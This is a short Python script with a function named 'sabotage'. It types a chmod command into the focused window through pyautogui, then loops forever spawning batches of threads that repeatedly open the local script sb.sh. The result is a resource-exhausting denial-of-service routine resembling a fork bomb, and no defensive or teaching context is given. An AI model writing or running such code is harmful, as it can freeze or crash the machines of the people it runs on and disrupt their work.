import threading
import os
import pyautogui as pg

def sabotage():
    pg.typewrite("chmod +x sb.sh")
    pg.press('enter')

    file_to_open = "./sb.sh"  # Replace with the path of the file you want to open
    num_threads = 10  # Replace with the number of threads you want to run at the same time

    def open_file():
        os.system(f"open {file_to_open}")

    threads = []
    while True:
        # Start a new batch of threads
        for _ in range(num_threads):
            t = threading.Thread(target=open_file)
            t.start()
            threads.append(t)

        # Wait for all threads in the batch to finish
        for t in threads:
            t.join()

        # Clear the list of threads to start a new batch
        threads = []
